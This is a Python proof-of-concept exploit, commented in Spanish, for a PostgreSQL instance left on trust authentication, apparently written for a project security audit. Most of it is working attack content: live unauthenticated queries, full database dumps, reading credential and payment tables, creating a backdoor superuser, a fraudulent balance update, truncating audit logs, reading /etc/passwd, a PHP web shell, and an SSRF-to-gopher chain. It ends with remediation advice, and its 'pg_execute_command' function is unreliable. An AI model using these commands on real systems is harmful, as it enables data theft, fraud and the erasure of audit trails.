#!/usr/bin/env python3
"""
PoC #4: PostgreSQL Sin Autenticación
=====================================
Vulnerabilidad: docker-compose.yml línea 40
POSTGRES_HOST_AUTH_METHOD: trust permite conexiones sin contraseña

Impacto:
- Acceso total a la base de datos sin credenciales
- Lectura de todos los datos (PII, credenciales, transacciones)
- Modificación/eliminación de datos
- Ejecución de comandos en el servidor (si hay extensiones)
- Escalación de privilegios

CVSS: 9.8 (Crítico)
CWE-306: Missing Authentication for Critical Function
CWE-287: Improper Authentication
"""

import subprocess
import sys


def check_psql_available():
    """Verifica si psql está disponible"""
    try:
        result = subprocess.run(
            ["which", "psql"],
            capture_output=True,
            text=True
        )
        return result.returncode == 0
    except:
        return False


def exploit_postgres_no_auth():
    """Explota PostgreSQL sin autenticación"""
    print("=" * 70)
    print("PoC #4: PostgreSQL Sin Autenticación (trust)")
    print("=" * 70)

    # Configuración del objetivo
    DB_HOST = "localhost"
    DB_PORT = "5432"
    DB_USER = "postgres"  # Usuario por defecto

    print(f"\n[*] Objetivo: {DB_HOST}:{DB_PORT}")
    print(f"[*] Usuario: {DB_USER} (sin contraseña)")
    print("[*] Método de autenticación: trust\n")

    if not check_psql_available():
        print("[!] psql no está instalado. Mostrando comandos de explotación:\n")
        demonstrate_attack_commands(DB_HOST, DB_PORT, DB_USER)
        return

    # Comandos de ataque
    attack_queries = [
        ("Versión de PostgreSQL", "SELECT version();"),
        ("Usuario actual", "SELECT current_user;"),
        ("Bases de datos", "SELECT datname FROM pg_database;"),
        ("Usuarios del sistema", "SELECT usename, usesuper FROM pg_user;"),
        ("Tablas disponibles", "SELECT tablename FROM pg_tables WHERE schemaname = 'public';"),
        ("Configuración de conexión", "SHOW all;"),
    ]

    for description, query in attack_queries:
        print(f"\n[*] {description}")
        print(f"    Query: {query}")

        try:
            result = subprocess.run(
                [
                    "psql",
                    "-h", DB_HOST,
                    "-p", DB_PORT,
                    "-U", DB_USER,
                    "-c", query
                ],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                print(f"[+] ÉXITO - Sin autenticación requerida!")
                # Mostrar primeras líneas del resultado
                lines = result.stdout.strip().split('\n')[:5]
                for line in lines:
                    print(f"    {line}")
                if len(result.stdout.strip().split('\n')) > 5:
                    print("    ...")
            else:
                print(f"[-] Error: {result.stderr[:100]}")

        except subprocess.TimeoutExpired:
            print("[-] Timeout - el servicio puede no estar activo")
        except Exception as e:
            print(f"[-] Error: {e}")


def demonstrate_attack_commands(host, port, user):
    """Muestra los comandos de ataque sin ejecutarlos"""
    print("-" * 70)
    print("COMANDOS DE EXPLOTACIÓN")
    print("-" * 70)

    commands = f"""
    # Conexión sin contraseña
    psql -h {host} -p {port} -U {user}

    # Listar todas las bases de datos
    psql -h {host} -p {port} -U {user} -c "SELECT datname FROM pg_database;"

    # Dump completo de la base de datos
    pg_dump -h {host} -p {port} -U {user} postgres > dump.sql

    # Listar todos los usuarios
    psql -h {host} -p {port} -U {user} -c "SELECT * FROM pg_user;"

    # Buscar tablas con datos sensibles
    psql -h {host} -p {port} -U {user} -c "SELECT table_name FROM information_schema.tables WHERE table_schema='public';"

    # Leer datos de usuarios (si existe la tabla)
    psql -h {host} -p {port} -U {user} -c "SELECT * FROM users LIMIT 10;"

    # Leer datos de pagos/transacciones
    psql -h {host} -p {port} -U {user} -c "SELECT * FROM payments LIMIT 10;"
    psql -h {host} -p {port} -U {user} -c "SELECT * FROM transactions LIMIT 10;"

    # Crear usuario administrativo backdoor
    psql -h {host} -p {port} -U {user} -c "CREATE USER backdoor WITH SUPERUSER PASSWORD 'backdoor123';"

    # Modificar datos (transferencia fraudulenta)
    psql -h {host} -p {port} -U {user} -c "UPDATE accounts SET balance = balance + 1000000 WHERE user_id = 'attacker';"

    # Eliminar logs de auditoría
    psql -h {host} -p {port} -U {user} -c "TRUNCATE audit_log;"
    """
    print(commands)


def demonstrate_data_exfiltration():
    """Demuestra técnicas de exfiltración de datos"""
    print("\n" + "-" * 70)
    print("TÉCNICAS DE EXFILTRACIÓN DE DATOS")
    print("-" * 70)

    print("""
    [*] EXTRACCIÓN DE DATOS SENSIBLES:

    1. DUMP COMPLETO DE LA BASE DE DATOS
       pg_dump -h target -U postgres > all_data.sql

    2. EXPORTAR A CSV (para análisis)
       psql -h target -U postgres -c "COPY users TO '/tmp/users.csv' CSV HEADER;"

    3. BÚSQUEDA DE CREDENCIALES
       SELECT * FROM users WHERE password IS NOT NULL;
       SELECT * FROM credentials;
       SELECT * FROM api_keys;

    4. INFORMACIÓN FINANCIERA
       SELECT * FROM payments;
       SELECT * FROM credit_cards;
       SELECT * FROM bank_accounts;

    5. DATOS PERSONALES (PII)
       SELECT name, email, ssn, address FROM customers;
    """)


def demonstrate_privilege_escalation():
    """Demuestra escalación de privilegios"""
    print("\n" + "-" * 70)
    print("ESCALACIÓN DE PRIVILEGIOS")
    print("-" * 70)

    print("""
    [*] TÉCNICAS DE ESCALACIÓN:

    1. CREAR SUPERUSUARIO BACKDOOR
       CREATE USER evil WITH SUPERUSER PASSWORD 'evil123';

    2. EJECUCIÓN DE COMANDOS (si pg_execute_command está habilitado)
       SELECT pg_execute_command('id');
       SELECT pg_execute_command('cat /etc/passwd');

    3. LECTURA DE ARCHIVOS (con permisos de postgres)
       SELECT pg_read_file('/etc/passwd');
       SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');

    4. ESCRITURA DE ARCHIVOS (web shell)
       COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

    5. CONEXIÓN A OTRAS BASES DE DATOS
       \\c otra_base_de_datos
       SELECT * FROM sensitive_data;
    """)


def ssrf_to_postgres():
    """Demuestra acceso a PostgreSQL via SSRF"""
    print("\n" + "-" * 70)
    print("ACCESO VIA SSRF (CADENA DE ATAQUE)")
    print("-" * 70)

    print("""
    [*] COMBINANDO SSRF + POSTGRESQL SIN AUTH:

    El worker.py tiene SSRF, y PostgreSQL no tiene autenticación.
    Un atacante puede combinar ambas vulnerabilidades:

    1. Usar SSRF para alcanzar PostgreSQL en la red interna
       POST /webhook
       {"url": "http://users-db:5432/"}

    2. Enviar comandos PostgreSQL via protocolo
       (Requiere herramientas especializadas como gopher://)

    3. Ejemplo con Gopherus (herramienta de explotación):
       gopherus --exploit postgresql
       -> Genera payload para ejecutar comandos SQL

    4. El payload SSRF sería algo como:
       {"url": "gopher://users-db:5432/_<PAYLOAD_ENCODED>"}

    [!] IMPACTO: Acceso completo a la base de datos desde Internet
        a través de la cadena SSRF -> PostgreSQL
    """)


if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║  POSTGRESQL EXPLOITATION - SOLO PARA PRUEBAS AUTORIZADAS      ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)

    exploit_postgres_no_auth()
    demonstrate_data_exfiltration()
    demonstrate_privilege_escalation()
    ssrf_to_postgres()

    print("\n" + "=" * 70)
    print("RESUMEN DEL IMPACTO")
    print("=" * 70)
    print("""
    [!] VULNERABILIDAD: PostgreSQL sin autenticación (trust)

    [!] IMPACTO CRÍTICO:
        - Acceso completo a todos los datos
        - Robo de información sensible (PII, credenciales, financiera)
        - Modificación de datos (fraude, manipulación)
        - Eliminación de datos y logs
        - Posible ejecución de comandos en el servidor
        - Creación de usuarios backdoor

    [!] CUMPLIMIENTO:
        - Violación de PCI-DSS (datos de pago)
        - Violación de GDPR (datos personales)
        - Violación de HIPAA (si hay datos médicos)

    [!] REMEDIACIÓN:
        - NUNCA usar POSTGRES_HOST_AUTH_METHOD: trust
        - Configurar contraseñas fuertes: POSTGRES_PASSWORD
        - Usar autenticación md5 o scram-sha-256
        - Limitar conexiones por IP (pg_hba.conf)
        - Cifrar conexiones con SSL
    """)
